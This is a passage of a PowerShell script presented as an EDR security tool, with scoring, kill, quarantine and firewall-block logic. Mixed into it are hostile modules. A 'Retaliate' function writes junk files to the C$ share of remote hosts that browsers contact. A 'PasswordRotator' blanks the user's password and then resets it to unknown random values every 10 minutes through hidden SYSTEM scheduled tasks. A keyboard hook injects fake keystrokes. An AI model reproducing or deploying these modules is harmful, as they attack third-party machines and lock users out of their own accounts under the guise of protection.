        $name = [System.IO.Path]::GetFileName($NewPath).ToLower()
        foreach ($pat in $Script:RansomNotePatterns) {
            if ($name.Contains($pat)) {
                Write-EDRLog "RANSOMWARE: Ransom note detected: $NewPath" 'CRITICAL'
                $score += 70; break
            }
        }
    }
    return $score
}

# ═══════════════════════════════════════════════════════════════
# SECTION 11: SCORING ENGINE
# ═══════════════════════════════════════════════════════════════
$Script:ScoreWeights = @{ Static=1.0; Behavior=1.5; Yara=1.3; Mitre=0.8; Network=1.2; Chain=1.4; Memory=1.5; HashRep=1.0 }

function Get-ThreatScore {
    param([Parameter(Mandatory)] $A)
    $bd = [PSCustomObject]@{ StaticScore=0; BehaviorScore=0; YaraScore=0; MitreScore=0; NetworkScore=0; ChainScore=0; MemoryScore=0; HashRepScore=0; BonusPenalties=0; TotalScore=0; Verdict='Clean'; Confidence='Low'; Details=@() }

    if ($A.StaticResults) { $bd.StaticScore=[Math]::Min($A.StaticResults.Score,100) }
    if ($A.BehaviorResults) { $bd.BehaviorScore=[Math]::Min($A.BehaviorResults.Score,150) }
    if ($A.YaraMatches -and $A.YaraMatches.Count -gt 0) {
        $yt = ($A.YaraMatches | Measure-Object -Property Score -Sum).Sum
        $bd.YaraScore = [Math]::Min($yt, 120)
        if ($A.YaraMatches | Where-Object { $_.Severity -eq 'Critical' }) { $bd.YaraScore = [Math]::Min($bd.YaraScore*1.3, 150) }
    }
    if ($A.MitreMapping -and $A.MitreMapping.Count -gt 0) {
        $mb = $A.MitreMapping.Count * 8 + @($A.MitreMapping | Where-Object { $_.Confidence -eq 'High' }).Count * 5
        $ut = @($A.MitreMapping | Select-Object -ExpandProperty Tactic -Unique).Count
        if ($ut -ge 3) { $mb = $mb * 1.3 }
        $bd.MitreScore = [Math]::Min($mb, 80)
    }
    if ($A.NetworkResults) {
        $bd.NetworkScore = [Math]::Min($A.NetworkResults.Score, 80)
        if ($A.NetworkResults.BeaconingDetected) { $bd.NetworkScore += 30 }
        $bd.NetworkScore = [Math]::Min($bd.NetworkScore, 100)
    }
    if ($A.ChainResults) { $bd.ChainScore=[Math]::Min($A.ChainResults.Score,120) }
    if ($A.MemoryResults) { $bd.MemoryScore=[Math]::Min($A.MemoryResults.Score,150) }
    if ($A.HashRepResults -and $A.HashRepResults.IsKnownMalicious) { $bd.HashRepScore=$A.HashRepResults.Score }

    $adj = 0
    if ($A.FilePath -and (Test-Path $A.FilePath -ErrorAction SilentlyContinue)) {
        try {
            $sig = Get-AuthenticodeSignature $A.FilePath -ErrorAction SilentlyContinue
            if ($sig -and $sig.Status -eq 'Valid') {
                $adj -= 20
                foreach ($pub in @('Microsoft','Google','Mozilla','Adobe','Oracle','Apple','Intel','NVIDIA')) {
                    if ($sig.SignerCertificate.Subject -match $pub) { $adj -= 30; break }
                }
            }
        } catch { }
    }
    $src = 0
    if ($bd.StaticScore -gt 20) { $src++ }; if ($bd.BehaviorScore -gt 20) { $src++ }
    if ($bd.YaraScore -gt 0) { $src++ }; if ($bd.NetworkScore -gt 10) { $src++ }
    if ($bd.ChainScore -gt 20) { $src++ }; if ($bd.MemoryScore -gt 0) { $src++ }
    if ($src -ge 4) { $adj += 35 } elseif ($src -ge 3) { $adj += 25 }
    $bd.BonusPenalties = $adj

    $wt = ($bd.StaticScore*$Script:ScoreWeights.Static) + ($bd.BehaviorScore*$Script:ScoreWeights.Behavior) +
          ($bd.YaraScore*$Script:ScoreWeights.Yara) + ($bd.MitreScore*$Script:ScoreWeights.Mitre) +
          ($bd.NetworkScore*$Script:ScoreWeights.Network) + ($bd.ChainScore*$Script:ScoreWeights.Chain) +
          ($bd.MemoryScore*$Script:ScoreWeights.Memory) + ($bd.HashRepScore*$Script:ScoreWeights.HashRep) + $adj
    $bd.TotalScore = [Math]::Max(0, [Math]::Round($wt))

    if ($bd.TotalScore -ge 120) { $bd.Verdict='Critical' } elseif ($bd.TotalScore -ge 80) { $bd.Verdict='Malicious' }
    elseif ($bd.TotalScore -ge 50) { $bd.Verdict='Suspicious' } elseif ($bd.TotalScore -ge 25) { $bd.Verdict='Low' }

    $sc = 0; @($bd.StaticScore,$bd.BehaviorScore,$bd.YaraScore,$bd.MitreScore,$bd.NetworkScore,$bd.ChainScore,$bd.MemoryScore) | ForEach-Object { if ($_ -gt 0) { $sc++ } }
    if ($sc -ge 4) { $bd.Confidence='High' } elseif ($sc -ge 2) { $bd.Confidence='Medium' }
    return $bd
}

# ═══════════════════════════════════════════════════════════════
# SECTION 12: RESPONSE ENGINE (FULLY AUTOMATIC)
# ═══════════════════════════════════════════════════════════════
function Invoke-ThreatResponse {
    param($A, [int]$Score, [string]$Verdict)
    $actions = [System.Collections.ArrayList]::new()
    if ($Score -ge $Script:ResponseConfig.AlertThreshold) {
        $alertId = [guid]::NewGuid().ToString('N').Substring(0,8)
        $target = _NV $A.FilePath "PID:$($A.ProcessId)"
        $alert = [PSCustomObject]@{ AlertId=$alertId; Timestamp=Get-Date; Score=$Score; Verdict=$Verdict; Target=$target; CommandLine=$A.CommandLine }
        $alertDir = Join-Path $Script:EDRConfig.LogPath 'Alerts'
        if (-not (Test-Path $alertDir)) { New-Item -ItemType Directory -Path $alertDir -Force | Out-Null }
        $alert | ConvertTo-Json -Depth 5 | Set-Content (Join-Path $alertDir "${alertId}_$(Get-Date -Format 'yyyyMMdd_HHmmss').json")
        $Script:AlertHistory.Add($alert) | Out-Null
        $actions.Add("Alert: $alertId") | Out-Null
    }
    # Auto-response always enabled
    if ($Score -ge $Script:ResponseConfig.AutoKillThreshold -and $A.ProcessId -and -not (Test-IsSelfProcess $A.ProcessId)) {
        try {
            $proc = Get-Process -Id $A.ProcessId -ErrorAction SilentlyContinue
            if ($proc -and $proc.Name -notin $Script:ResponseConfig.ProtectedProcesses) {
                $proc | Stop-Process -Force -ErrorAction Stop
                Write-EDRLog "KILLED: $($proc.Name) (PID $($A.ProcessId))" 'CRITICAL'
                $actions.Add("Killed: $($proc.Name)") | Out-Null
            }
        } catch { }
    }
    if ($Score -ge $Script:ResponseConfig.AutoQuarantineThreshold -and $A.FilePath -and -not (Test-IsExcludedPath $A.FilePath)) {
        try {
            if (Test-Path $A.FilePath) {
                $qDir = $Script:EDRConfig.QuarantinePath
                if (-not (Test-Path $qDir)) { New-Item -ItemType Directory -Path $qDir -Force | Out-Null }
                $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
                $origName = [System.IO.Path]::GetFileName($A.FilePath)
                $qPath = Join-Path $qDir "${ts}_${origName}.quarantined"
                @{ OriginalPath=$A.FilePath; QuarantinedAt=(Get-Date -Format 'o'); Score=$A.TotalScore; Verdict=$A.Verdict } |
                    ConvertTo-Json -Depth 5 | Set-Content "${qPath}.meta.json"
                Move-Item -Path $A.FilePath -Destination $qPath -Force
                Write-EDRLog "QUARANTINED: $($A.FilePath)" 'CRITICAL'
                $actions.Add("Quarantined: $origName") | Out-Null
            }
        } catch { }
    }
    if ($Score -ge $Script:ResponseConfig.AutoBlockThreshold -and $A.NetworkResults -and $A.NetworkResults.SuspiciousConns.Count -gt 0) {
        foreach ($conn in $A.NetworkResults.SuspiciousConns) {
            try {
                $ip = $conn.RemoteAddress
                if (-not (Get-NetFirewallRule -DisplayName "EDR_Block_$ip" -ErrorAction SilentlyContinue)) {
                    New-NetFirewallRule -DisplayName "EDR_Block_$ip" -Direction Outbound -Action Block -RemoteAddress $ip -ErrorAction Stop | Out-Null
                    New-NetFirewallRule -DisplayName "EDR_Block_${ip}_In" -Direction Inbound -Action Block -RemoteAddress $ip -ErrorAction Stop | Out-Null
                    Write-EDRLog "BLOCKED: $ip" 'CRITICAL'; $actions.Add("Blocked: $ip") | Out-Null
                }
            } catch { }
        }
    }
    if ($actions.Count -eq 0) { return 'None' }; return ($actions -join '; ')
}

# ═══════════════════════════════════════════════════════════════
# SECTION 13: GSHIELD MODULES
# ═══════════════════════════════════════════════════════════════

# ── Key Scrambler ──────────────────────────────────────────────
function Start-KeyScrambler {
    try {
        if (-not ([System.Management.Automation.PSTypeName]'KeyScrambler').Type) {
            Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Threading;
public class KeyScrambler {
    const int WH_KEYBOARD_LL=13; const int WM_KEYDOWN=0x0100;
    const uint INPUT_KEYBOARD=1; const uint KEYEVENTF_UNICODE=0x0004; const uint KEYEVENTF_KEYUP=0x0002;
    [StructLayout(LayoutKind.Sequential)] public struct KBDLLHOOKSTRUCT { public uint vkCode,scanCode,flags,time; public IntPtr dwExtraInfo; }
    [StructLayout(LayoutKind.Sequential)] public struct INPUT { public uint type; public INPUTUNION u; }
    [StructLayout(LayoutKind.Explicit)] public struct INPUTUNION { [FieldOffset(0)] public KEYBDINPUT ki; }
    [StructLayout(LayoutKind.Sequential)] public struct KEYBDINPUT { public ushort wVk,wScan; public uint dwFlags,time; public IntPtr dwExtraInfo; }
    [StructLayout(LayoutKind.Sequential)] public struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam,lParam; public uint time; public int x,y; }
    [DllImport("user32.dll",SetLastError=true)] static extern IntPtr SetWindowsHookEx(int id,IntPtr fn,IntPtr mod,uint tid);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h,int n,IntPtr w,IntPtr l);
    [DllImport("user32.dll")] static extern bool GetMessage(out MSG m,IntPtr hw,uint f,uint t);
    [DllImport("user32.dll")] static extern bool TranslateMessage(ref MSG m);
    [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref MSG m);
    [DllImport("user32.dll")] static extern uint SendInput(uint n,INPUT[] inp,int sz);
    [DllImport("user32.dll")] static extern IntPtr GetMessageExtraInfo();
    [DllImport("user32.dll")] static extern short GetKeyState(int vk);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
    delegate IntPtr LLKProc(int n,IntPtr w,IntPtr l);
    static IntPtr _hook=IntPtr.Zero; static LLKProc _proc; static Random _rnd=new Random();
    static bool ModDown() { return (GetKeyState(0x10)&0x8000)!=0||(GetKeyState(0x11)&0x8000)!=0||(GetKeyState(0x12)&0x8000)!=0; }
    static void Fake(char c) {
        var inp=new INPUT[2];
        inp[0].type=INPUT_KEYBOARD; inp[0].u.ki.wVk=0; inp[0].u.ki.wScan=(ushort)c; inp[0].u.ki.dwFlags=KEYEVENTF_UNICODE; inp[0].u.ki.dwExtraInfo=GetMessageExtraInfo();
        inp[1]=inp[0]; inp[1].u.ki.dwFlags=KEYEVENTF_UNICODE|KEYEVENTF_KEYUP;
        SendInput(2,inp,Marshal.SizeOf(typeof(INPUT))); Thread.Sleep(_rnd.Next(1,7));
    }
    static void Flood() { if(_rnd.NextDouble()<0.5)return; for(int i=0;i<_rnd.Next(1,7);i++)Fake((char)_rnd.Next(65,91)); }
    static IntPtr Hook(int n,IntPtr w,IntPtr l) {
        if(n>=0&&w==(IntPtr)WM_KEYDOWN) { var k=(KBDLLHOOKSTRUCT)Marshal.PtrToStructure(l,typeof(KBDLLHOOKSTRUCT));
            if((k.flags&0x10)==0&&!ModDown()&&k.vkCode>=65&&k.vkCode<=90) { if(_rnd.NextDouble()<0.75)Flood(); var r=CallNextHookEx(_hook,n,w,l); if(_rnd.NextDouble()<0.75)Flood(); return r; } }
        return CallNextHookEx(_hook,n,w,l);
    }
    public static void Start() { if(_hook!=IntPtr.Zero)return; _proc=Hook; _hook=SetWindowsHookEx(WH_KEYBOARD_LL,Marshal.GetFunctionPointerForDelegate(_proc),GetModuleHandle(null),0);
        if(_hook==IntPtr.Zero)return; MSG msg; while(GetMessage(out msg,IntPtr.Zero,0,0)){TranslateMessage(ref msg);DispatchMessage(ref msg);} }
}
'@ -ErrorAction Stop
        }
        $rs = New-GShieldRunspace
        $rs.ApartmentState = 'STA'; $rs.ThreadOptions = 'ReuseThread'; $rs.Open()
        $ps = [powershell]::Create(); $ps.Runspace = $rs
        [void]$ps.AddScript({ [KeyScrambler]::Start() })
        $ps.BeginInvoke() | Out-Null
        Write-EDRLog 'KeyScrambler started (keylogger blinding active)' 'INFO'
    } catch { Write-EDRLog "KeyScrambler failed: $_" 'WARN' }
}

# ── UAC Enforcement ────────────────────────────────────────────
function Invoke-UACEnforce {
    try {
        $raw = (Get-ItemProperty -Path $Script:UACPolicyKey -Name 'ConsentPromptBehaviorAdmin' -ErrorAction SilentlyContinue).ConsentPromptBehaviorAdmin
        $cur = if ($null -eq $raw) { $null } else { [int]$raw }
        if ($cur -ne $Script:UACConsentDesired) {
            Set-ItemProperty -Path $Script:UACPolicyKey -Name 'ConsentPromptBehaviorAdmin' -Value $Script:UACConsentDesired -Type DWord -Force
            Write-EDRLog "UAC: ConsentPromptBehaviorAdmin enforced to $Script:UACConsentDesired (was $cur)" 'WARN'
        }
    } catch { }
}

# ── Retaliate Monitor ─────────────────────────────────────────
function Test-IsActiveBrowsing {
    param([string]$RemoteAddress, [string]$ProcessName, [int]$RemotePort)
    if ($Script:BrowserNames -notcontains $ProcessName.ToLower()) { return $false }
    if ($RemoteAddress -match '^(127\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)') { return $true }
    if ($Script:NeverRetaliateIPs -contains $RemoteAddress) { return $true }
    if ($Script:AllowedIPs -contains $RemoteAddress) { return $true }
    $now = Get-Date
    if ($RemotePort -eq 443 -or $RemotePort -eq 80) {
        $Script:BrowserConns[$RemoteAddress] = $now
        return $true
    }
    foreach ($ip in $Script:BrowserConns.Keys) {
        if (($now - $Script:BrowserConns[$ip]).TotalSeconds -le 30) { return $true }
    }
    return $false
}

function Invoke-Retaliate {
    param([string]$RemoteAddress, [int]$RemotePort, [string]$ProcessName)
    $key = "$RemoteAddress|$ProcessName"
    if ($Script:RetaliatedConns.ContainsKey($key)) { return }
    Write-EDRLog "RETALIATE: Phoning-home detected $RemoteAddress`:$RemotePort from $ProcessName" 'ALERT'
    $Script:RetaliatedConns[$key] = @{ IP=$RemoteAddress; Port=$RemotePort; Process=$ProcessName; Timestamp=Get-Date }
    try {
        $remotePath = "\\$RemoteAddress\C$"
        if (Test-Path $remotePath -ErrorAction SilentlyContinue) {
            $counter = 1
            while ($counter -le 10) {
                try {
                    $garbage = [byte[]]::new(10485760)
                    (New-Object System.Random).NextBytes($garbage)
                    [System.IO.File]::WriteAllBytes("$remotePath\garbage_$counter.dat", $garbage)
                    $counter++
                } catch { break }
            }
        }
    } catch { }
}

function Invoke-RetaliateMonitorCycle {
    $conns = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue |
        Where-Object { $_.RemoteAddress -ne '0.0.0.0' -and $_.RemoteAddress -ne '::' -and
                       $_.RemoteAddress -ne '127.0.0.1' -and $_.RemoteAddress -ne '::1' }
    foreach ($conn in $conns) {
        try {
            $proc = Get-Process -Id $conn.OwningProcess -ErrorAction Stop
            $procName = ($proc.ProcessName -replace '\.exe','').Trim().ToLower()
            if ($Script:BrowserNames -notcontains $procName) { continue }
            if (-not (Test-IsActiveBrowsing -RemoteAddress $conn.RemoteAddress -ProcessName $proc.ProcessName -RemotePort $conn.RemotePort)) {
                Invoke-Retaliate -RemoteAddress $conn.RemoteAddress -RemotePort $conn.RemotePort -ProcessName $proc.ProcessName
            }
        } catch { }
    }
    # Expire stale browser connection cache
    $now = Get-Date
    $stale = @($Script:BrowserConns.Keys | Where-Object { ($now - $Script:BrowserConns[$_]).TotalSeconds -gt 60 })
    $stale | ForEach-Object { $Script:BrowserConns.Remove($_) }
}

# ── Password Rotator ───────────────────────────────────────────
$Script:PwRotatorWorkerScript = @'
param([string]$Mode, [string]$Username)
$ErrorActionPreference = 'Continue'
$TargetDir = if ($PSScriptRoot) { $PSScriptRoot } else { 'C:\ProgramData\PasswordRotator' }
$UserFile  = Join-Path $TargetDir 'currentuser.txt'

function Get-LoggedInUser {
    $u = $null
    try { $u = (Get-CimInstance -ClassName Win32_ComputerSystem -EA Stop).UserName } catch {}
    if (-not $u) { try { $u = $env:USERNAME } catch {} }
    if (-not $u) { return $null }
    if ($u -match '\\') { return $u.Split('\')[-1] }
    return $u
}
function Set-UserPassword { param([string]$U, [string]$P)
    if ([string]::IsNullOrWhiteSpace($U)) { return }
    try { Set-LocalUser -Name $U -Password (ConvertTo-SecureString -String $P -AsPlainText -Force) -EA Stop }
    catch {
        try { [ADSI]$a = "WinNT://$env:COMPUTERNAME/$U,user"; $a.SetPassword($P) }
        catch { "$(Get-Date -Format o) Set-UserPassword: $_" | Out-File (Join-Path $TargetDir 'log.txt') -Append }
    }
}
function Set-UserPasswordBlank { param([string]$N)
    if ([string]::IsNullOrWhiteSpace($N)) { return }
    try { [ADSI]$a = "WinNT://$env:COMPUTERNAME/$N,user"; $a.SetPassword('') }
    catch { try { & net user $N '' } catch { "$(Get-Date -Format o) Blank: $_" | Out-File (Join-Path $TargetDir 'log.txt') -Append } }
}
function New-RandomPwd {
    $c = 'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#$%'
    -join ((1..24) | ForEach-Object { $c[(Get-Random -Maximum $c.Length)] })
}
function Remove-TasksForUser { param([string]$U)
    $s = $U -replace '[^a-zA-Z0-9]','_'
    @("PasswordRotator-10Min-$s","PasswordRotator-OnLogoff-$s") | ForEach-Object {
        Unregister-ScheduledTask -TaskName $_ -Confirm:$false -EA SilentlyContinue
        schtasks.exe /Delete /TN $_ /F 2>$null | Out-Null
    }
}
function Register-Rotate10MinTask {
    param([string]$Safe, [string]$WorkerPath)
    $tn = "PasswordRotator-10Min-$Safe"
    $psArg = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$WorkerPath`" -Mode Rotate"
    $ok = $false
    try {
        $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
        $t10 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(10) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days 3650)
        $a10 = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $psArg
        Register-ScheduledTask -TaskName $tn -Action $a10 -Trigger $t10 -Principal $principal -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable) -Force -ErrorAction Stop | Out-Null
        $ok = $true
    } catch {
        "$(Get-Date -Format o) Register-Rotate10MinTask (PS): $_" | Out-File (Join-Path $TargetDir 'log.txt') -Append
    }
    if (-not $ok) {
        schtasks.exe /Delete /TN $tn /F 2>$null | Out-Null
        $we = $WorkerPath -replace '"','\"'
        $tr = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$we`" -Mode Rotate"
        schtasks.exe /Create /TN $tn /TR $tr /SC MINUTE /MO 10 /RU SYSTEM /RL HIGHEST /F 2>$null | Out-Null
    }
}
function Register-LogoffCleanupTask {
    param([string]$Safe, [string]$WorkerPath, [string]$User)
    $tn = "PasswordRotator-OnLogoff-$Safe"
    $psArg = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$WorkerPath`" -Mode Logoff -Username $User"
    try {
        $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
        $tOff = New-ScheduledTaskTrigger -AtLogOff -User $User
        $aOff = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $psArg
        Register-ScheduledTask -TaskName $tn -Action $aOff -Trigger $tOff -Principal $principal -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable) -Force -ErrorAction Stop | Out-Null
    } catch {
        "$(Get-Date -Format o) Register-LogoffCleanupTask: $_" | Out-File (Join-Path $TargetDir 'log.txt') -Append
    }
}

switch ($Mode) {
    'Logon' {
        $u = Get-LoggedInUser; if (-not $u) { exit 0 }
        if (-not (Test-Path $TargetDir)) { New-Item -Path $TargetDir -ItemType Directory -Force | Out-Null }
        $u | Set-Content -Path $UserFile -Force
        Remove-TasksForUser -U $u
        $safe   = $u -replace '[^a-zA-Z0-9]','_'
        $worker = Join-Path $TargetDir 'Worker.ps1'
        Register-Rotate10MinTask -Safe $safe -WorkerPath $worker
        Register-LogoffCleanupTask -Safe $safe -WorkerPath $worker -User $u
        Start-Sleep -Seconds 60
        Set-UserPassword -U $u -P (New-RandomPwd)
    }
    'Rotate' {
        if (-not (Test-Path $UserFile)) { exit 0 }
        $u = (Get-Content -Path $UserFile -Raw).Trim()
        if ($u) { Set-UserPassword -U $u -P (New-RandomPwd) }
    }
    'Logoff' {
        if ($Username) {
            Set-UserPasswordBlank -N $Username
            $s = $Username -replace '[^a-zA-Z0-9]','_'
            @("PasswordRotator-10Min-$s","PasswordRotator-OnLogoff-$s") | ForEach-Object {
                Unregister-ScheduledTask -TaskName $_ -Confirm:$false -EA SilentlyContinue
                schtasks.exe /Delete /TN $_ /F 2>$null | Out-Null
            }
        }
    }
    'StartupBlank' {
        if (-not (Test-Path $UserFile)) { exit 0 }
        $u = (Get-Content -Path $UserFile -Raw -EA SilentlyContinue).Trim()
        if ($u) { Set-UserPasswordBlank -N $u }
    }
}
'@

function Install-PasswordRotator {
    if (-not (Test-Path $Script:PwRotatorDir)) { New-Item -Path $Script:PwRotatorDir -ItemType Directory -Force | Out-Null }
    $workerPath = Join-Path $Script:PwRotatorDir 'Worker.ps1'
    $Script:PwRotatorWorkerScript | Set-Content -Path $workerPath -Encoding UTF8 -Force

    # Resolve current user robustly
    $currentUser = $null
    try { $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name } catch {}
    if (-not $currentUser) { try { $currentUser = $env:USERNAME } catch {} }
    if ($currentUser -match '\\') { $currentUser = $currentUser.Split('\')[-1] }

    if (-not $currentUser) {
        Write-EDRLog 'PasswordRotator: could not determine current user, skipping install' 'WARN'
        return
    }

    $workerEscaped = $workerPath -replace '"','\"'
    foreach ($tn in @('PasswordRotator-OnLogon', 'PasswordRotator-AtStartup')) {
        Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue
        schtasks.exe /Delete /TN $tn /F 2>$null | Out-Null
    }

    function Register-PasswordRotatorHostTask {
        param([string]$TaskName, [string]$ModeArgs)
        $psArg = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$workerPath`" $ModeArgs"
        try {
            $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $psArg
            $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
            $trigger = if ($TaskName -match 'Logon') { New-ScheduledTaskTrigger -AtLogOn } else { New-ScheduledTaskTrigger -AtStartup }
            Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
            return $true
        } catch { return $false }
    }

    if (-not (Register-PasswordRotatorHostTask -TaskName 'PasswordRotator-OnLogon' -ModeArgs '-Mode Logon')) {
        schtasks.exe /Create /TN "PasswordRotator-OnLogon" `
            /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$workerEscaped`" -Mode Logon" `
            /SC ONLOGON /RU SYSTEM /RL HIGHEST /F 2>$null | Out-Null
        Write-EDRLog 'PasswordRotator-OnLogon: registered via schtasks (PS ScheduledTasks failed)' 'WARN'
    }
    if (-not (Register-PasswordRotatorHostTask -TaskName 'PasswordRotator-AtStartup' -ModeArgs '-Mode StartupBlank')) {
        schtasks.exe /Create /TN "PasswordRotator-AtStartup" `
            /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$workerEscaped`" -Mode StartupBlank" `
            /SC ONSTART /RU SYSTEM /RL HIGHEST /F 2>$null | Out-Null
        Write-EDRLog 'PasswordRotator-AtStartup: registered via schtasks (PS ScheduledTasks failed)' 'WARN'
    }

    $currentUser | Set-Content -Path (Join-Path $Script:PwRotatorDir 'currentuser.txt') -Force -EA SilentlyContinue

    try {
        [ADSI]$adsi = "WinNT://$env:COMPUTERNAME/$currentUser,user"
        $adsi.SetPassword('')
    } catch { }

    Write-EDRLog "PasswordRotator installed for user: $currentUser" 'INFO'
}

# ═══════════════════════════════════════════════════════════════
# SECTION 14: CORE ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════
function Invoke-FullAnalysis {
    param([string]$FilePath, [int]$ProcessId, [string]$CommandLine)
    if (Test-IsSelfProcess $ProcessId) { return $null }
    if (Test-IsExcludedPath $FilePath) { return $null }

    $aid = [guid]::NewGuid().ToString('N').Substring(0,12)
    $result = [PSCustomObject]@{
        AnalysisId=$aid; Timestamp=Get-Date; FilePath=$FilePath; ProcessId=$ProcessId; CommandLine=$CommandLine
        StaticResults=$null; BehaviorResults=$null; MitreMapping=@(); YaraMatches=@()
        NetworkResults=$null; ChainResults=$null; MemoryResults=$null; HashRepResults=$null
        TotalScore=0; Verdict='Clean'; ResponseTaken='None'
    }

    if ($FilePath -and (Test-Path $FilePath)) { $result.StaticResults = Invoke-StaticAnalysis -FilePath $FilePath }
    if ($result.StaticResults -and $result.StaticResults.Hashes.SHA256) {
        $result.HashRepResults = Get-HashReputation -SHA256 $result.StaticResults.Hashes.SHA256
    }
    if ($result.StaticResults -and $result.StaticResults.Hashes.SHA256) {
        if (Test-IsWhitelisted -FilePath $FilePath -SHA256 $result.StaticResults.Hashes.SHA256) { return $null }
    }
    if ($ProcessId -or $CommandLine) { $result.BehaviorResults = Invoke-BehaviorAnalysis -ProcessId $ProcessId -CommandLine $CommandLine -FilePath $FilePath }
    if ($FilePath -and (Test-Path $FilePath)) { $result.YaraMatches = Invoke-YaraRuleScan -FilePath $FilePath -CommandLine $CommandLine }
    elseif ($CommandLine) { $result.YaraMatches = Invoke-YaraRuleScan -CommandLine $CommandLine }
    $result.MitreMapping = Get-MitreMapping -BehaviorResults $result.BehaviorResults -StaticResults $result.StaticResults -CommandLine $CommandLine
    if ($Script:EDRConfig.EnableNetwork -and $ProcessId) { $result.NetworkResults = Invoke-NetworkAnalysis -ProcessId $ProcessId }
    if ($Script:EDRConfig.EnableChainMonitor -and $ProcessId) { $result.ChainResults = Invoke-ChainAnalysis -ProcessId $ProcessId }
    if ($Script:EDRConfig.EnableMemoryScan -and $ProcessId) { $result.MemoryResults = Invoke-MemoryScan -ProcessId $ProcessId }
    $scoreResult = Get-ThreatScore -A $result
    $result.TotalScore = $scoreResult.TotalScore; $result.Verdict = $scoreResult.Verdict
    $result.ResponseTaken = Invoke-ThreatResponse -A $result -Score $result.TotalScore -Verdict $result.Verdict
    $ll = switch ($result.Verdict) { 'Critical' {'CRITICAL'} 'Malicious' {'ALERT'} 'Suspicious' {'WARN'} default {'INFO'} }
    if ($result.TotalScore -gt 0) {
        $ms = ($result.MitreMapping | ForEach-Object { $_.TechniqueId }) -join ','
        Write-EDRLog "[$aid] Score=$($result.TotalScore) Verdict=$($result.Verdict) MITRE=[$ms]" $ll
    }
    $Script:AlertHistory.Add($result) | Out-Null
    return $result
}

# ── Real-Time Monitors ─────────────────────────────────────────

# Shared action block for process-start events (used by all monitor fallbacks)
$Script:ProcessMonitorAction = {
    param($ProcessId, $ProcessName)
    if ($ProcessId -eq $Script:EDRConfig.SelfProcessId) { return }
    try {
        $wp = Get-CimInstance Win32_Process -Filter "ProcessId=$ProcessId" -ErrorAction SilentlyContinue
        $cl2 = if ($wp) { $wp.CommandLine } else { '' }
        $pp2 = if ($wp) { $wp.ParentProcessId } else { 0 }
        $ep2 = if ($wp) { $wp.ExecutablePath } else { '' }
        $name2 = if ($ProcessName) { $ProcessName } elseif ($wp) { $wp.Name } else { '' }
        $Script:ProcessTracker[$ProcessId] = @{ Name=$name2; CommandLine=$cl2; ParentPID=$pp2; ExePath=$ep2; StartTime=Get-Date; Children=@() }
        if ($Script:ProcessTracker.ContainsKey($pp2)) { $Script:ProcessTracker[$pp2].Children += $ProcessId }
        Invoke-FullAnalysis -FilePath $ep2 -ProcessId $ProcessId -CommandLine $cl2
    } catch { }
}

function Start-ProcessMonitor {
    $monitorStarted = $false

    # ── Attempt 1: WMI event subscription (preferred, real-time) ──
    try {
        $sub = Register-WmiEvent -Query 'SELECT * FROM Win32_ProcessStartTrace' -SourceIdentifier 'EDR_ProcessMonitor' -ErrorAction Stop -Action {
            $p = $Event.SourceEventArgs.NewEvent
            & $Script:ProcessMonitorAction $p.ProcessID $p.ProcessName
        }
        $Script:ActiveWatchers.Add($sub) | Out-Null
        $monitorStarted = $true
        Write-EDRLog 'ProcessMonitor: started via WMI event subscription' 'INFO'
    } catch {
        Write-EDRLog "ProcessMonitor: WMI event failed ($_) — trying CIM fallback" 'WARN'
    }

    # ── Attempt 2: CIM indication subscription (works on newer PS / stripped WMI) ──
    if (-not $monitorStarted) {
        try {
            $cimSub = Register-CimIndicationEvent -Query 'SELECT * FROM Win32_ProcessStartTrace' -SourceIdentifier 'EDR_ProcessMonitor_CIM' -ErrorAction Stop -Action {
                $p = $Event.SourceEventArgs.NewEvent
                $pid2 = $p.CimInstanceProperties['ProcessID'].Value
                $name2 = $p.CimInstanceProperties['ProcessName'].Value
                & $Script:ProcessMonitorAction $pid2 $name2
            }
            $Script:ActiveWatchers.Add($cimSub) | Out-Null
            $monitorStarted = $true
            Write-EDRLog 'ProcessMonitor: started via CIM indication event' 'INFO'
        } catch {
            Write-EDRLog "ProcessMonitor: CIM indication failed ($_) — trying polling fallback" 'WARN'
        }
    }

    # ── Attempt 3: Polling timer (works on any Windows, even stripped) ──
    if (-not $monitorStarted) {
        try {
            $Script:_PollKnownPids = @{}
            # Seed with current processes so we only detect NEW ones
            try {
